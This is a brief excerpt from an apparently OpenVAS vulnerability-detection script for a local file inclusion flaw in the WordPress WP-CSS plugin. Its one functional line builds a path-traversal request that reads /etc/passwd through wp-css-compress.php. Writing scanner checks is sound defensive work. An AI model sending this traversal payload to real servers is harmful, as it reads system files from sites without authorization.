...
# $Id: secpod_wordpress_wp_css_lfi_vuln.nasl 10235 2018-06-18 13:14:33Z cfischer $
#
...
if(dir == "/") dir = "";
url = string(dir, "/wp-content/plugins/wp-css/wp-css-compress.php?f=", crap(data:"..%2f", length:3*15), "etc/passwd");
